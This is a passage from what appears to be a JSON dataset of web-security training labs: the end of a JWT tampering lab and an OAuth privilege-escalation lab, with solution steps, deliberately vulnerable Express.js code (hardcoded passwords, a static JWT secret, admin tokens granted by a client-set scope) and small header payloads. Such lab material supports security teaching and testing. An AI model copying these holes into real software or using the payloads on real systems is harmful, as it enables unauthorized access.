      "src code": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).send('Invalid credentials'); } const token = jwt.sign({ sub: username }, 'secretKey'); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers.authorization.split(' ')[1]; jwt.verify(token, 'secretKey', (err, decoded) => { if (err || decoded.sub !== 'carlos') { return res.status(403).send('Access denied'); } res.send('Account details for Carlos'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:4000'));",
      "payloads": [
        "Authorization: Bearer [MODIFIED_JWT_TOKEN]"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration Leading to Privilege Escalation",
      "Lab Description": "This lab demonstrates an OAuth misconfiguration where an attacker can gain unauthorized access to an admin account by exploiting an improperly configured OAuth authorization flow. The attacker needs to manipulate the OAuth request to escalate privileges. To solve the lab, manipulate the OAuth flow to escalate to an admin role and access the admin dashboard.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Intercept the OAuth authorization request using Burp Suite and examine the request parameters.",
        "2. Notice that the 'scope' parameter is misconfigured and allows access to unauthorized resources.",
        "3. Modify the 'scope' parameter to include 'admin' and send the modified request to the OAuth token endpoint.",
        "4. Capture the OAuth token response and use it to make a request to the '/admin' endpoint.",
        "5. Verify that the response grants access to the admin dashboard, solving the lab."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'admin123', role: 'admin' }, { username: 'carlos', password: 'password123', role: 'user' }]; app.post('/oauth/authorize', (req, res) => { const { scope, username } = req.body; if (scope === 'admin') { res.json({ access_token: 'admin_token', token_type: 'bearer' }); } else { res.json({ access_token: 'user_token', token_type: 'bearer' }); } }); app.get('/admin', (req, res) => { const { authorization } = req.headers; if (authorization === 'Bearer admin_token') { res.send('Admin Dashboard'); } else { res.status(403).send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:4000'));",
      "payloads": [
        "scope=admin",
        "Authorization: Bearer admin_token"
      ]
    }
]
   
  
  
  